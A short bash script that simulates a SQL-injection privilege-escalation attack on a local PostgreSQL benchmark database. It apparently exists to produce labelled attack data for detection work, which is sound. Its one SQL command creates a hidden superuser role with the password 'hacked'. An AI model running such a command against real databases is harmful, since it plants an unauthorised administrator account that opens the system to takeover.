#!/bin/bash
# Template: SQLi privilege-escalation-via-role attack.
set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_identity_lib.sh
casce_new_identity

echo "Simulating SQL Injection Attack (attack_sqli_role)... identity=${CASCE_USER}@${CASCE_IP}"
/dataset_workspace/logger.sh mark_attack "attack_sqli_role" start

# Give the injected role a name derived from this run's synthetic identity
# so repeated runs never collide on an existing role.
SQL_COMMANDS=(
  "CREATE ROLE sqli_admin_${CASCE_USER} SUPERUSER LOGIN PASSWORD 'hacked';"
)

for sql in "${SQL_COMMANDS[@]}"; do
  psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)${sql}"
  casce_random_delay 0.3 2.5
done

/dataset_workspace/logger.sh mark_attack "attack_sqli_role" end
